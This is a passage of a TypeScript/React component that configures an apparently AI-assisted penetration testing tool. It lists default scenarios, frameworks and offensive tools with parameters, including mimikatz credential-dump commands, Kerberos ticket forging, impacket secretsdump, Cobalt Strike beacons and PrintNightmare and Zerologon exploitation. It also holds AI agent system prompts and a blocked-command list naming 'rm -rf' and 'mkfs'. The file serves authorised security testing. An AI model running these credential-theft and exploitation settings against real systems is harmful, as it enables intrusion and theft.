            'echo "Analyze client-side authentication and authorization"',
            'echo "Check for sensitive data exposure in client-side code"',
            'echo "Test WebSocket and HTML5 security implementations"'
          ],
          enabled: true,
          prerequisites: ['webapp-business-logic']
        },
        {
          id: 'webapp-api-testing',
          name: 'API Security Testing',
          description: 'Comprehensive API security assessment including REST/GraphQL vulnerabilities, authentication, and rate limiting',
          order: 12,
          estimatedTime: '40 min',
          riskLevel: 'critical',
          executionType: 'automatic',
          requiredTools: ['postman', 'insomnia', 'nuclei', 'arjun'],
          commands: [
            'nuclei -t /root/nuclei-templates/http/vulnerabilities/generic/ -u <api_target>',
            'arjun -u <api_target> -m POST',
            'echo "Test API authentication and authorization mechanisms"',
            'echo "Analyze GraphQL introspection and injection vulnerabilities"'
          ],
          enabled: true,
          prerequisites: ['webapp-client-side']
        },
        {
          id: 'webapp-reporting',
          name: 'Vulnerability Assessment Report',
          description: 'Generate comprehensive web application security assessment report with prioritized findings and remediation guidance',
          order: 13,
          estimatedTime: '30 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['reporting-engine', 'custom-scripts'],
          enabled: true,
          prerequisites: ['webapp-api-testing']
        }
      ]
    }
  ], []);

  /**
   * Initialize default security frameworks
   */
  const initializeDefaultFrameworks = useCallback((): SecurityFramework[] => [
    {
      id: 'owasp-top10',
      name: 'OWASP Top 10',
      description: 'OWASP Top 10 Web Application Security Risks',
      version: '2021',
      categories: ['web', 'application'],
      enabled: true,
      configuration: {
        includeAll: true,
        customCategories: []
      }
    },
    {
      id: 'mitre-attack',
      name: 'MITRE ATT&CK',
      description: 'MITRE ATT&CK Framework for threat modeling',
      version: '14.1',
      categories: ['enterprise', 'mobile', 'ics'],
      enabled: true,
      configuration: {
        tactics: ['initial-access', 'execution', 'persistence', 'privilege-escalation'],
        platforms: ['windows', 'linux', 'macos']
      }
    },
    {
      id: 'nist-csf',
      name: 'NIST Cybersecurity Framework',
      description: 'NIST CSF for comprehensive security assessment',
      version: '2.0',
      categories: ['identify', 'protect', 'detect', 'respond', 'recover'],
      enabled: false,
      configuration: {
        functions: ['all'],
        maturityLevel: 'developing'
      }
    },
    {
      id: 'ptes',
      name: 'Penetration Testing Execution Standard',
      description: 'PTES methodology for structured penetration testing',
      version: '1.1',
      categories: ['methodology', 'process'],
      enabled: true,
      configuration: {
        phases: ['pre-engagement', 'intelligence-gathering', 'threat-modeling', 'vulnerability-analysis', 'exploitation', 'post-exploitation', 'reporting'],
        depth: 'comprehensive'
      }
    }
  ], []);

  /**
   * Initialize default security tools
   */
  const initializeDefaultTools = useCallback((): SecurityTool[] => [
    // ===========================
    // NETWORK SCANNING & RECONNAISSANCE
    // ===========================
    {
      id: 'nmap',
      name: 'Nmap',
      version: '7.94',
      category: 'network',
      description: 'Network discovery and security auditing',
      enabled: true,
      aggressionLevel: 3,
      timeout: 300,
      retries: 2,
      concurrent: true,
      customParams: {
        scanType: 'syn',
        osDetection: true,
        serviceVersion: true,
        scripts: ['default', 'vuln']
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'masscan',
      name: 'Masscan',
      version: '1.3.2',
      category: 'network',
      description: 'High-speed port scanner for large networks',
      enabled: true,
      aggressionLevel: 4,
      timeout: 180,
      retries: 1,
      concurrent: false,
      customParams: {
        rate: 1000,
        ports: '1-65535',
        excludeFile: '/etc/masscan/exclude.conf'
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'zmap',
      name: 'ZMap',
      version: '2.1.1',
      category: 'network',
      description: 'Internet-wide network scanner',
      enabled: false,
      aggressionLevel: 5,
      timeout: 300,
      retries: 1,
      concurrent: false,
      customParams: {
        bandwidthMbps: 10,
        probeModule: 'tcp_synscan',
        outputModule: 'csv'
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },

    // ===========================
    // ACTIVE DIRECTORY TOOLS
    // ===========================
    {
      id: 'bloodhound',
      name: 'BloodHound',
      version: '4.3.1',
      category: 'ad',
      description: 'Active Directory attack path analysis and visualization',
      enabled: false,
      aggressionLevel: 4,
      timeout: 600,
      retries: 3,
      concurrent: false,
      customParams: {
        collectMethod: 'All',
        excludeDCs: false,
        ldapPort: 389,
        globalCatalogPort: 3268,
        zipFilename: 'bloodhound_data.zip'
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'crackmapexec',
      name: 'CrackMapExec',
      version: '5.4.0',
      category: 'ad',
      description: 'Post-exploitation tool for Active Directory environments',
      enabled: false,
      aggressionLevel: 5,
      timeout: 900,
      retries: 2,
      concurrent: true,
      customParams: {
        protocols: ['smb', 'ssh', 'winrm', 'rdp', 'ldap'],
        modules: ['lsassy', 'mimikatz', 'ntdsutil'],
        threads: 100,
        timeout: 20
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'mimikatz',
      name: 'Mimikatz',
      version: '2.2.0',
      category: 'ad',
      description: 'Windows credential extraction and manipulation',
      enabled: false,
      aggressionLevel: 5,
      timeout: 300,
      retries: 1,
      concurrent: false,
      customParams: {
        commands: ['sekurlsa::logonpasswords', 'sekurlsa::tickets', 'lsadump::sam'],
        outputFile: 'mimikatz_output.txt',
        elevatePrivs: true
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'rubeus',
      name: 'Rubeus',
      version: '2.2.3',
      category: 'ad',
      description: 'Kerberos interaction and abuse toolkit',
      enabled: false,
      aggressionLevel: 4,
      timeout: 600,
      retries: 2,
      concurrent: false,
      customParams: {
        commands: ['kerberoast', 'asreproast', 'golden', 'silver'],
        format: 'hashcat',
        targetUser: '',
        domain: ''
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'impacket',
      name: 'Impacket Suite',
      version: '0.11.0',
      category: 'ad',
      description: 'Python network protocols implementation for AD attacks',
      enabled: false,
      aggressionLevel: 5,
      timeout: 900,
      retries: 3,
      concurrent: true,
      customParams: {
        tools: ['secretsdump', 'psexec', 'wmiexec', 'dcomexec', 'smbexec'],
        hashFormat: 'lm:nt',
        k: false,
        dc_ip: ''
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'responder',
      name: 'Responder',
      version: '3.1.3.0',
      category: 'ad',
      description: 'LLMNR, NBT-NS and MDNS poisoner for credential harvesting',
      enabled: false,
      aggressionLevel: 4,
      timeout: 1800,
      retries: 1,
      concurrent: false,
      customParams: {
        interface: 'eth0',
        analyze: false,
        wpad: true,
        fingerprint: true,
        forceWpadAuth: true
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'certipy',
      name: 'Certipy',
      version: '4.8.2',
      category: 'ad',
      description: 'Active Directory Certificate Services exploitation tool',
      enabled: false,
      aggressionLevel: 4,
      timeout: 600,
      retries: 2,
      concurrent: false,
      customParams: {
        commands: ['find', 'req', 'auth'],
        template: '',
        ca: '',
        upn: '',
        dns: ''
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'ldapdomaindump',
      name: 'LDAPDomainDump',
      version: '0.9.4',
      category: 'ad',
      description: 'Active Directory information dumper via LDAP',
      enabled: false,
      aggressionLevel: 3,
      timeout: 300,
      retries: 2,
      concurrent: false,
      customParams: {
        noHtml: false,
        noJson: false,
        noGrep: false,
        outputDir: './ldap_dump'
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'powerview',
      name: 'PowerView',
      version: '4.0',
      category: 'ad',
      description: 'PowerShell tool for AD reconnaissance and exploitation',
      enabled: false,
      aggressionLevel: 4,
      timeout: 600,
      retries: 2,
      concurrent: false,
      customParams: {
        commands: ['Get-DomainUser', 'Get-DomainComputer', 'Get-DomainGroup', 'Find-LocalAdminAccess'],
        domain: '',
        server: '',
        ldapFilter: ''
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },

    // ===========================
    // WEB APPLICATION TOOLS
    // ===========================
    {
      id: 'nuclei',
      name: 'Nuclei',
      version: '3.1.0',
      category: 'web',
      description: 'Fast vulnerability scanner based on templates',
      enabled: true,
      aggressionLevel: 2,
      timeout: 180,
      retries: 1,
      concurrent: true,
      customParams: {
        templates: 'all',
        severity: ['critical', 'high', 'medium'],
        rateLimit: 150,
        bulkSize: 25,
        templateDir: '/root/nuclei-templates'
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'sqlmap',
      name: 'SQLMap',
      version: '1.7.11',
      category: 'web',
      description: 'Automatic SQL injection exploitation',
      enabled: false,
      aggressionLevel: 5,
      timeout: 900,
      retries: 3,
      concurrent: false,
      customParams: {
        risk: 2,
        level: 3,
        techniques: 'BEUSTQ',
        dbms: 'all',
        threads: 5,
        delay: 0
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite Professional',
      version: '2023.12.1',
      category: 'web',
      description: 'Comprehensive web application security testing platform',
      enabled: false,
      aggressionLevel: 4,
      timeout: 1800,
      retries: 1,
      concurrent: false,
      customParams: {
        scanMode: 'crawl_and_audit',
        auditItems: ['all'],
        crawlStrategy: 'most_complete',
        maxCrawlDepth: 10
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'zap',
      name: 'OWASP ZAP',
      version: '2.14.0',
      category: 'web',
      description: 'Web application security scanner',
      enabled: false,
      aggressionLevel: 3,
      timeout: 1200,
      retries: 2,
      concurrent: false,
      customParams: {
        spiderDepth: 5,
        ajaxSpider: true,
        activeScan: true,
        passiveScan: true
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'gobuster',
      name: 'Gobuster',
      version: '3.6',
      category: 'web',
      description: 'Directory/file and DNS busting tool',
      enabled: true,
      aggressionLevel: 3,
      timeout: 600,
      retries: 2,
      concurrent: true,
      customParams: {
        mode: 'dir',
        wordlist: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt',
        threads: 10,
        extensions: 'php,html,js,txt,xml'
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'ffuf',
      name: 'FFUF',
      version: '2.1.0',
      category: 'web',
      description: 'Fast web fuzzer written in Go',
      enabled: true,
      aggressionLevel: 4,
      timeout: 900,
      retries: 2,
      concurrent: true,
      customParams: {
        wordlist: '/usr/share/seclists/Discovery/Web-Content/big.txt',
        threads: 40,
        delay: '0.1s',
        filterCodes: [404, 403]
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'feroxbuster',
      name: 'Feroxbuster',
      version: '2.10.1',
      category: 'web',
      description: 'Simple, fast, recursive content discovery tool',
      enabled: false,
      aggressionLevel: 4,
      timeout: 1200,
      retries: 2,
      concurrent: true,
      customParams: {
        wordlist: '/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt',
        threads: 50,
        depth: 4,
        extensions: ['php', 'js', 'html', 'txt']
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'nikto',
      name: 'Nikto',
      version: '2.5.0',
      category: 'web',
      description: 'Web server scanner for vulnerabilities',
      enabled: false,
      aggressionLevel: 3,
      timeout: 900,
      retries: 2,
      concurrent: false,
      customParams: {
        tuning: 'x',
        plugins: 'all',
        format: 'htm',
        timeout: 10
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'commix',
      name: 'Commix',
      version: '3.7',
      category: 'web',
      description: 'Command injection exploitation tool',
      enabled: false,
      aggressionLevel: 5,
      timeout: 600,
      retries: 2,
      concurrent: false,
      customParams: {
        technique: 'all',
        level: 3,
        risk: 2,
        timeSec: 5
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },

    // ===========================
    // CREDENTIAL TOOLS
    // ===========================
    {
      id: 'hashcat',
      name: 'Hashcat',
      version: '6.2.6',
      category: 'ad',
      description: 'Advanced password recovery and hash cracking',
      enabled: false,
      aggressionLevel: 3,
      timeout: 3600,
      retries: 1,
      concurrent: true,
      customParams: {
        attackMode: 0,
        hashType: 1000,
        wordlist: '/usr/share/wordlists/rockyou.txt',
        rules: '/usr/share/hashcat/rules/best64.rule'
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'john',
      name: 'John the Ripper',
      version: '1.9.0',
      category: 'ad',
      description: 'Password cracking tool',
      enabled: false,
      aggressionLevel: 3,
      timeout: 3600,
      retries: 1,
      concurrent: true,
      customParams: {
        format: 'NT',
        wordlist: '/usr/share/wordlists/rockyou.txt',
        rules: 'single',
        fork: 4
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'hydra',
      name: 'Hydra',
      version: '9.5',
      category: 'network',
      description: 'Network logon cracker supporting multiple protocols',
      enabled: false,
      aggressionLevel: 4,
      timeout: 1800,
      retries: 1,
      concurrent: true,
      customParams: {
        protocols: ['ssh', 'ftp', 'http-get', 'http-post-form', 'smb'],
        threads: 16,
        userList: '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
        passlist: '/usr/share/wordlists/rockyou.txt'
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'medusa',
      name: 'Medusa',
      version: '2.2',
      category: 'network',
      description: 'Speedy, parallel, and modular login brute-forcer',
      enabled: false,
      aggressionLevel: 4,
      timeout: 1800,
      retries: 1,
      concurrent: true,
      customParams: {
        threads: 20,
        timeout: 3,
        retryWait: 3,
        retryCount: 3
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },

    // ===========================
    // OSINT & RECONNAISSANCE
    // ===========================
    {
      id: 'subfinder',
      name: 'Subfinder',
      version: '2.6.3',
      category: 'osint',
      description: 'Subdomain discovery tool',
      enabled: true,
      aggressionLevel: 1,
      timeout: 120,
      retries: 2,
      concurrent: true,
      customParams: {
        sources: 'all',
        recursive: true,
        silent: false,
        threads: 10
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'amass',
      name: 'OWASP Amass',
      version: '4.2.0',
      category: 'osint',
      description: 'In-depth attack surface mapping and asset discovery',
      enabled: false,
      aggressionLevel: 2,
      timeout: 1800,
      retries: 1,
      concurrent: false,
      customParams: {
        mode: 'enum',
        passive: false,
        bruteforce: true,
        alterations: true
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'theHarvester',
      name: 'theHarvester',
      version: '4.5.1',
      category: 'osint',
      description: 'E-mail, subdomain and people names harvester',
      enabled: false,
      aggressionLevel: 1,
      timeout: 300,
      retries: 2,
      concurrent: true,
      customParams: {
        sources: ['google', 'bing', 'duckduckgo', 'linkedin', 'twitter'],
        limit: 500,
        start: 0
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'recon-ng',
      name: 'Recon-ng',
      version: '5.1.2',
      category: 'osint',
      description: 'Full-featured reconnaissance framework',
      enabled: false,
      aggressionLevel: 2,
      timeout: 900,
      retries: 1,
      concurrent: false,
      customParams: {
        modules: ['recon/domains-hosts/google_site_web', 'recon/hosts-ports/shodan_ip'],
        workspace: 'default'
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'shodan',
      name: 'Shodan CLI',
      version: '1.31.0',
      category: 'osint',
      description: 'Search engine for Internet-connected devices',
      enabled: false,
      aggressionLevel: 1,
      timeout: 180,
      retries: 2,
      concurrent: true,
      customParams: {
        apiKey: '',
        searchLimit: 100,
        facets: ['org', 'port', 'country']
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },

    // ===========================
    // EXPLOITATION FRAMEWORKS
    // ===========================
    {
      id: 'metasploit',
      name: 'Metasploit Framework',
      version: '6.3.57',
      category: 'exploitation',
      description: 'Penetration testing framework',
      enabled: false,
      aggressionLevel: 5,
      timeout: 1800,
      retries: 1,
      concurrent: false,
      customParams: {
        workspace: 'default',
        autoExploit: false,
        payloadType: 'meterpreter',
        lhost: '',
        lport: 4444
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'empire',
      name: 'PowerShell Empire',
      version: '5.4.3',
      category: 'exploitation',
      description: 'Pure PowerShell post-exploitation agent',
      enabled: false,
      aggressionLevel: 5,
      timeout: 1800,
      retries: 1,
      concurrent: false,
      customParams: {
        listener: 'http',
        stager: 'multi/launcher',
        killDate: '',
        workingHours: ''
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'cobaltstrike',
      name: 'Cobalt Strike',
      version: '4.9',
      category: 'exploitation',
      description: 'Advanced threat emulation platform',
      enabled: false,
      aggressionLevel: 5,
      timeout: 3600,
      retries: 1,
      concurrent: false,
      customParams: {
        teamserver: '',
        password: '',
        profile: 'default.profile',
        beacon: 'windows/beacon_https/reverse_https'
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },

    // ===========================
    // NETWORK & SERVICE TOOLS
    // ===========================
    {
      id: 'testssl',
      name: 'testssl.sh',
      version: '3.2rc3',
      category: 'network',
      description: 'SSL/TLS encryption testing tool',
      enabled: false,
      aggressionLevel: 2,
      timeout: 300,
      retries: 2,
      concurrent: true,
      customParams: {
        protocols: 'all',
        ciphers: 'all',
        vulnerabilities: true,
        certInfo: true
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'sslscan',
      name: 'SSLScan',
      version: '2.0.15',
      category: 'network',
      description: 'SSL/TLS configuration scanner',
      enabled: false,
      aggressionLevel: 2,
      timeout: 120,
      retries: 2,
      concurrent: true,
      customParams: {
        showCertificate: true,
        checkCertificate: true,
        showClientCiphers: true,
        showCipherIds: true
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'enum4linux',
      name: 'Enum4Linux',
      version: '0.9.1',
      category: 'ad',
      description: 'Linux alternative to enum.exe for enumerating SMB hosts',
      enabled: false,
      aggressionLevel: 3,
      timeout: 300,
      retries: 2,
      concurrent: false,
      customParams: {
        enumAll: true,
        verbose: true,
        timeout: 5,
        dictionary: '/usr/share/enum4linux/share/enum4linux/dict.txt'
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'smbclient',
      name: 'SMBClient',
      version: '4.17.12',
      category: 'ad',
      description: 'SMB/CIFS client for accessing SMB shares',
      enabled: false,
      aggressionLevel: 2,
      timeout: 180,
      retries: 2,
      concurrent: true,
      customParams: {
        nullSession: true,
        listShares: true,
        recursiveList: false,
        maxProtocol: 'SMB3'
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'rpcclient',
      name: 'RPCClient',
      version: '4.17.12',
      category: 'ad',
      description: 'Tool for executing client-side MS-RPC functions',
      enabled: false,
      aggressionLevel: 2,
      timeout: 180,
      retries: 2,
      concurrent: false,
      customParams: {
        nullSession: true,
        commands: ['enumdomusers', 'enumdomgroups', 'querydominfo'],
        timeout: 10
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },

    // ===========================
    // ADDITIONAL SPECIALIZED AD TOOLS
    // ===========================
    {
      id: 'kerbrute',
      name: 'Kerbrute',
      version: '1.0.3',
      category: 'ad',
      description: 'Kerberos username enumeration and password spraying',
      enabled: false,
      aggressionLevel: 3,
      timeout: 600,
      retries: 2,
      concurrent: true,
      customParams: {
        mode: 'userenum',
        domain: '',
        dc: '',
        threads: 10,
        delay: 0
      },
      riskLevel: 'medium',
      requiresConfirmation: false
    },
    {
      id: 'adidnsdump',
      name: 'ADIDNSDump',
      version: '0.6.0',
      category: 'ad',
      description: 'Active Directory Integrated DNS dumping tool',
      enabled: false,
      aggressionLevel: 2,
      timeout: 300,
      retries: 2,
      concurrent: false,
      customParams: {
        dns_tcp: false,
        include_tombstoned: false,
        zone: '',
        record_type: 'all'
      },
      riskLevel: 'low',
      requiresConfirmation: false
    },
    {
      id: 'lsassy',
      name: 'Lsassy',
      version: '3.1.8',
      category: 'ad',
      description: 'Python library to extract credentials from lsass remotely',
      enabled: false,
      aggressionLevel: 5,
      timeout: 300,
      retries: 1,
      concurrent: false,
      customParams: {
        method: 'comsvcs',
        timeout: 10,
        threads: 2,
        quiet: false
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'sprayhound',
      name: 'SprayHound',
      version: '0.1.6',
      category: 'ad',
      description: 'Password spraying tool with BloodHound integration',
      enabled: false,
      aggressionLevel: 4,
      timeout: 900,
      retries: 1,
      concurrent: false,
      customParams: {
        delay: 1,
        jitter: 1,
        timeout: 25,
        lockout_threshold: 3
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'petitpotam',
      name: 'PetitPotam',
      version: '1.0',
      category: 'ad',
      description: 'Tool to coerce Windows hosts to authenticate via MS-EFSRPC',
      enabled: false,
      aggressionLevel: 4,
      timeout: 180,
      retries: 2,
      concurrent: false,
      customParams: {
        pipe: 'lsarpc',
        method: 'EfsRpcOpenFileRaw',
        verbose: true
      },
      riskLevel: 'high',
      requiresConfirmation: true
    },
    {
      id: 'printnightmare',
      name: 'PrintNightmare',
      version: '1.0',
      category: 'ad',
      description: 'Print Spooler privilege escalation exploitation',
      enabled: false,
      aggressionLevel: 5,
      timeout: 300,
      retries: 1,
      concurrent: false,
      customParams: {
        dll_path: '',
        share: '',
        target: '',
        driver_name: 'Xerox'
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    },
    {
      id: 'zerologon',
      name: 'Zerologon Checker',
      version: '1.0',
      category: 'ad',
      description: 'CVE-2020-1472 Zerologon vulnerability checker and exploiter',
      enabled: false,
      aggressionLevel: 5,
      timeout: 120,
      retries: 1,
      concurrent: false,
      customParams: {
        action: 'check',
        target_computer: '',
        target_ip: ''
      },
      riskLevel: 'critical',
      requiresConfirmation: true
    }
  ], []);

  // ===========================
  // EFFECT HOOKS
  // ===========================

  /**
   * Initialize component with default data and merge with initial configuration
   */
  useEffect(() => {
    const defaultConfig: PentestConfiguration = {
      modules: initializeDefaultModules(),
      scenarios: initializeDefaultScenarios(),
      frameworks: initializeDefaultFrameworks(),
      tools: initializeDefaultTools(),
      aiAgent: {
        model: 'gpt-5-2025-08-07',
        fallbackModel: 'gpt-4.1-2025-04-14',
        temperature: 0.2,
        maxTokens: 2000,
        systemPrompt: 'You are an expert AI cybersecurity agent specializing in penetration testing and vulnerability assessment. Provide detailed, actionable insights while maintaining ethical and legal compliance.',
        enableReasoningMode: false,
        reasoningModel: 'o4-mini-2025-04-16',
        customInstructions: '',
        responseFormat: 'structured',
        safetyLevel: 'high',
        contextWindow: 200000,
        streamingEnabled: true,
        automationMode: 'human_approval',
        approvalThreshold: 'medium',
        useLocalModel: false,
        localModelConfig: {
          apiEndpoint: 'http://localhost',
          port: 11434,
          modelName: 'llama2',
          timeout: 30000,
          maxRetries: 3,
          provider: 'ollama'
        },
        kaliMCPServer: {
          enabled: false,
          serverEndpoint: 'http://kali-mcp-server.local',
          port: 8080,
          timeout: 60000,
          maxRetries: 3,
          enabledTools: ['nmap', 'sqlmap', 'nikto', 'gobuster', 'nuclei'],
          resourceLimits: {
            maxConcurrentJobs: 5,
            maxMemoryUsage: '2GB',
            maxExecutionTime: 3600
          },
          securitySettings: {
            sandboxMode: true,
            allowNetworkAccess: true,
            allowSystemCommands: false,
            blockedCommands: ['rm -rf', 'dd', 'mkfs', 'fdisk']
          }
        },
        guardrails: {
          enabled: true,
          mode: 'moderate',
          approvalRequired: true,
          autoApproveLevel: 'safe',
          rules: {
            blockDestructiveCommands: true,
            requireConfirmationForHighRisk: true,
            validateTargetScope: true,
            preventDataExfiltration: true,
            limitResourceUsage: true
          },
          customRules: [],
          notifications: {
            alertOnBlocked: true,
            alertOnApprovalNeeded: true,
            emailNotifications: false
          }
        },
        onlineResearch: {
          enabled: true,
          providers: {
            hacktricks: true,
            perplexity: true,
            shodan: false,
            cve: true,
            exploit_db: true
          },
          apiKeys: {},
          researchDepth: 'comprehensive',
          autoResearch: true,
          researchTriggers: ['vulnerability_found', 'new_target', 'exploitation_failed']
        },
        hackTricksIntegration: {
          enabled: true,
          autoLoadMethodology: true,
          preferredCategories: ['web', 'network', 'active-directory', 'kubernetes'],
          updateFrequency: 'daily'
        },
        systemPromptPreset: 'pentest-expert',
        customSystemPrompts: {
          'pentest-expert': 'You are an expert AI cybersecurity agent specializing in penetration testing and vulnerability assessment. Provide detailed, actionable insights while maintaining ethical and legal compliance.',
          'red-team': 'You are an advanced red team operator with deep expertise in offensive security. Focus on creative attack vectors while ensuring all activities remain within legal boundaries.',
          'compliance-focused': 'You are a cybersecurity compliance expert conducting authorized security assessments. Prioritize documentation, risk classification, and regulatory alignment in all analyses.',
          'beginner-friendly': 'You are a patient cybersecurity mentor helping newcomers learn penetration testing. Explain concepts clearly, provide educational context, and emphasize safety practices.'
        }
      },
      globalSettings: {
        aggressionLevel: 3,
        timeout: 300,
        retries: 3,
        concurrency: 5,
        stealth: true,
        automated: false,
        reportingLevel: 'standard'
      },
      metadata: {
        name: 'New Pentest Configuration',
        description: '',
        target: '',
        scope: '',
        created: new Date().toISOString(),
        modified: new Date().toISOString()
      }
    };

    // Merge with initial configuration if provided
    if (initialConfiguration) {
      const mergedConfig = { ...defaultConfig, ...initialConfiguration };
      setConfiguration(mergedConfig);
    } else {
      setConfiguration(defaultConfig);
    }
  }, [initializeDefaultModules, initializeDefaultFrameworks, initializeDefaultTools, initialConfiguration]);

  /**
   * Notify parent component of configuration changes
   */
  useEffect(() => {
    if (onConfigurationChange) {
      onConfigurationChange(configuration);
    }
  }, [configuration, onConfigurationChange]);

  // ===========================
  // EVENT HANDLERS
  // ===========================

  /**
   * Toggle module enabled state
   */
  const toggleModule = useCallback((moduleId: string) => {
    setConfiguration(prev => ({
      ...prev,
      modules: prev.modules.map(module =>
        module.id === moduleId ? { ...module, enabled: !module.enabled } : module
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Toggle scenario enabled state
   */
  const toggleScenario = useCallback((scenarioId: string) => {
    setConfiguration(prev => ({
      ...prev,
      scenarios: prev.scenarios.map(scenario =>
        scenario.id === scenarioId ? { ...scenario, enabled: !scenario.enabled } : scenario
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Toggle scenario phase enabled state
   */
  const toggleScenarioPhase = useCallback((scenarioId: string, phaseId: string) => {
    setConfiguration(prev => ({
      ...prev,
      scenarios: prev.scenarios.map(scenario =>
        scenario.id === scenarioId 
          ? {
              ...scenario,
              phases: scenario.phases.map(phase =>
                phase.id === phaseId ? { ...phase, enabled: !phase.enabled } : phase
              )
            }
          : scenario
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Toggle framework enabled state
   */
  const toggleFramework = useCallback((frameworkId: string) => {
    setConfiguration(prev => ({
      ...prev,
      frameworks: prev.frameworks.map(framework =>
        framework.id === frameworkId ? { ...framework, enabled: !framework.enabled } : framework
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Toggle tool enabled state
   */
  const toggleTool = useCallback((toolId: string) => {
    setConfiguration(prev => ({
      ...prev,
      tools: prev.tools.map(tool =>
        tool.id === toolId ? { ...tool, enabled: !tool.enabled } : tool
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Update tool aggression level
   */
  const updateToolAggression = useCallback((toolId: string, level: number) => {
    setConfiguration(prev => ({
      ...prev,
      tools: prev.tools.map(tool =>
        tool.id === toolId ? { ...tool, aggressionLevel: level } : tool
      ),
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Update global settings
   */
  const updateGlobalSettings = useCallback((key: keyof PentestConfiguration['globalSettings'], value: any) => {
    setConfiguration(prev => ({
      ...prev,
      globalSettings: { ...prev.globalSettings, [key]: value },
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Update AI Agent configuration
   */
  const updateAIAgentConfig = useCallback((key: keyof AIAgentConfiguration, value: any) => {
    setConfiguration(prev => ({
      ...prev,
      aiAgent: { ...prev.aiAgent, [key]: value },
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Test AI Agent connection
   */
  const testAIAgent = useCallback(async () => {
    const endpoint = configuration.aiAgent.useLocalModel 
      ? `${configuration.aiAgent.localModelConfig.apiEndpoint}:${configuration.aiAgent.localModelConfig.port}`
      : configuration.aiAgent.model;
      
    toast({
      title: "Testing AI Agent",
      description: `Testing connection to ${endpoint}...`,
    });

    // Mock test - in production, make actual API call
    setTimeout(() => {
      toast({
        title: "AI Agent Test",
        description: configuration.aiAgent.useLocalModel
          ? `Local model ${configuration.aiAgent.localModelConfig.modelName} is ready`
          : `${configuration.aiAgent.model} is ready for penetration testing`,
      });
    }, 2000);
  }, [configuration.aiAgent]);

  /**
   * Update local model configuration
   */
  const updateLocalModelConfig = useCallback((key: keyof AIAgentConfiguration['localModelConfig'], value: any) => {
    setConfiguration(prev => ({
      ...prev,
      aiAgent: { 
        ...prev.aiAgent, 
        localModelConfig: { ...prev.aiAgent.localModelConfig, [key]: value }
      },
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));
  }, []);

  /**
   * Handle system prompt preset selection
   */
  const handleSystemPromptPreset = useCallback((presetId: string) => {
    const preset = configuration.aiAgent.customSystemPrompts[presetId];
    if (preset) {
      setConfiguration(prev => ({
        ...prev,
        aiAgent: {
          ...prev.aiAgent,
          systemPromptPreset: presetId,
          systemPrompt: preset
        },
        metadata: { ...prev.metadata, modified: new Date().toISOString() }
      }));
    }
  }, [configuration.aiAgent.customSystemPrompts]);

  /**
   * Save custom system prompt
   */
  const saveCustomSystemPrompt = useCallback((name: string, prompt: string) => {
    if (!name.trim() || !prompt.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please provide both name and prompt content",
        variant: "destructive"
      });
      return;
    }

    setConfiguration(prev => ({
      ...prev,
      aiAgent: {
